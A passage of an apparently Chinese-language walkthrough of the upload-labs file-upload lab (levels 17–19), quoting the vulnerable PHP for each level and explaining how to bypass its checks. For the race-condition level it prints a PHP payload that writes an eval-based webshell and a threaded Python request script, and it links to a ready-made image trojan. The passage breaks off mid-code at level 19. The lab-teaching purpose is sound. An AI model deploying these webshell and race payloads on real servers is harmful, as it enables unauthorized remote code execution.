</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$im</span> <span class="o">=</span> <span class="nx">imagecreatefrompng</span><span class="p">(</span><span class="nv">$target_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$im</span> <span class="o">==</span> <span class="k">false</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;该文件不是png格式的图片！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$target_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                 <span class="c1">//给新图片指定文件名
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">srand</span><span class="p">(</span><span class="nx">time</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$newfilename</span> <span class="o">=</span> <span class="nx">strval</span><span class="p">(</span><span class="nx">rand</span><span class="p">())</span><span class="o">.</span><span class="s2">&#34;.png&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="c1">//显示二次渲染后的图片（使用用户上传图片生成的新图片）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$newfilename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$im</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$target_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>               
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;上传出错！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;gif&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/gif&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmpname</span><span class="p">,</span><span class="nv">$target_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//使用上传的图片生成新的图片
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$im</span> <span class="o">=</span> <span class="nx">imagecreatefromgif</span><span class="p">(</span><span class="nv">$target_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$im</span> <span class="o">==</span> <span class="k">false</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;该文件不是gif格式的图片！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$target_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">//给新图片指定文件名
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">srand</span><span class="p">(</span><span class="nx">time</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$newfilename</span> <span class="o">=</span> <span class="nx">strval</span><span class="p">(</span><span class="nx">rand</span><span class="p">())</span><span class="o">.</span><span class="s2">&#34;.gif&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="c1">//显示二次渲染后的图片（使用用户上传图片生成的新图片）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$newfilename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">imagegif</span><span class="p">(</span><span class="nv">$im</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$target_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;上传出错！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;只允许上传后缀为.jpg|.png|.gif的图片文件！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-16" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-16" class="header-mark"></a>绕过方法</h3><p>代码对上传图片判断<code>后缀名</code>、<code>content-type</code>，以及利用<code>imagecreatefromgif</code>判断是否为<code>gif</code>图片，最后再做了一次<code>二次渲染</code>。</p>
<p>解决方法：将木马放在不会被二次渲染清除的地方，这个位置需要去不断尝试。推荐用别人做好的图片马：</p>
<p><a href="https://wwe.lanzoui.com/iFSwwn53jaf" target="_blank" rel="noopener noreferrer">https://wwe.lanzoui.com/iFSwwn53jaf</a></p>
<p>​</p>
<h2 id="第十八关条件竞争" class="headerLink">
    <a href="#%e7%ac%ac%e5%8d%81%e5%85%ab%e5%85%b3%e6%9d%a1%e4%bb%b6%e7%ab%9e%e4%ba%89" class="header-mark"></a>第十八关(条件竞争)</h2><h3 id="相关源码-17" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-17" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ext_arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span><span class="s1">&#39;png&#39;</span><span class="p">,</span><span class="s1">&#39;gif&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span><span class="s2">&#34;.&#34;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$upload_file</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$file_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$upload_file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span><span class="nv">$ext_arr</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">             <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="o">.</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">99</span><span class="p">)</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">             <span class="nx">rename</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">             <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;只允许上传.jpg|.png|.gif类型文件！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-17" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-17" class="header-mark"></a>绕过方法</h3><p>代码先将上传的 文件保存在服务器的临时路径里，再通过检查来判断是否转移到正式路径。</p>
<p>从保存到临时路径到未通过检测、删除文件之间有个短暂的时间差，在此之前的文件是存在服务器上的，所以可以不断上传一个可以在生成webshell.php的文件，同时不断去访问这个文件，总有几率在文件未被删除时访问到文件，激活代码，产生一个webshell.php。</p>
<p>文件内容为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;webshell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php @eval($_POST[&#34;wtlr&#34;]) ?&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>重复发包的方法：</p>
<p>将抓到的包转到Intruder模块：</p>
<img src="https://pic.imgdb.cn/item/64cb623f1ddac507ccadf536.jpg" style="zoom:67%;" />
<img src="https://pic.imgdb.cn/item/64cb63021ddac507ccafaee3.jpg" style="zoom:67%;" />
<p>线程随便设置一下：</p>
<img src="https://pic.imgdb.cn/item/64cb63cc1ddac507ccb1e650.jpg" style="zoom:67%;" />
<p>最后点击**&ldquo;Start attack&rdquo;**就可以不断发包了。</p>
<p>重复访问url的脚本：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">concurrent.futures</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">visit_website</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">request_number</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Request </span><span class="si">{</span><span class="n">request_number</span><span class="si">}</span><span class="s2"> - Status code: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Request </span><span class="si">{</span><span class="n">request_number</span><span class="si">}</span><span class="s2"> - Error: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Request </span><span class="si">{</span><span class="n">request_number</span><span class="si">}</span><span class="s2"> - An error occurred:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 用户输入要访问的网站地址、请求数量和延迟时间</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;请输入要访问的网站地址（包括协议）：&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">num_requests</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;请输入请求数量：&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">delay</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;请输入每次请求的延迟时间（以秒为单位）：&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 创建线程池</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="n">concurrent</span><span class="o">.</span><span class="n">futures</span><span class="o">.</span><span class="n">ThreadPoolExecutor</span><span class="p">()</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 提交任务到线程池</span>
</span></span><span class="line"><span class="cl">    <span class="n">future_to_url</span> <span class="o">=</span> <span class="p">{</span><span class="n">executor</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">visit_website</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_requests</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># 获取任务结果</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">future</span> <span class="ow">in</span> <span class="n">concurrent</span><span class="o">.</span><span class="n">futures</span><span class="o">.</span><span class="n">as_completed</span><span class="p">(</span><span class="n">future_to_url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">future</span><span class="o">.</span><span class="n">result</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;An error occurred:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># 控制请求间隔</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">delay</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>​</p>
<h2 id="第十九关apache解析漏洞" class="headerLink">
    <a href="#%e7%ac%ac%e5%8d%81%e4%b9%9d%e5%85%b3apache%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e" class="header-mark"></a>第十九关(Apache解析漏洞)</h2><h3 id="相关源码-18" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-18" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">//index.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">require_once</span><span class="p">(</span><span class="s2">&#34;./myupload.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$imgFileName</span> <span class="o">=</span><span class="nx">time</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$u</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MyUpload</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">],</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">],</span><span class="nv">$imgFileName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$status_code</span> <span class="o">=</span> <span class="nv">$u</span><span class="o">-&gt;</span><span class="na">upload</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="nv">$status_code</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nv">$u</span><span class="o">-&gt;</span><span class="na">cls_upload_dir</span> <span class="o">.</span> <span class="nv">$u</span><span class="o">-&gt;</span><span class="na">cls_file_rename_to</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;文件已经被上传，但没有重命名。&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="o">-</span><span class="mi">1</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;这个文件不能上传到服务器的临时文件存储目录。&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="o">-</span><span class="mi">2</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传失败，上传目录不可写。&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="o">-</span><span class="mi">3</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传失败，无法上传该类型文件。&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="o">-</span><span class="mi">4</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传失败，上传的文件过大。&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="o">-</span><span class="mi">5</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传失败，服务器已经存在相同名称文件。&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="o">-</span><span class="mi">6</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;文件无法上传，文件不能复制到目标目录。&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>      
</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;未知错误！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//myupload.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">MyUpload</span><span class="p">{</span>
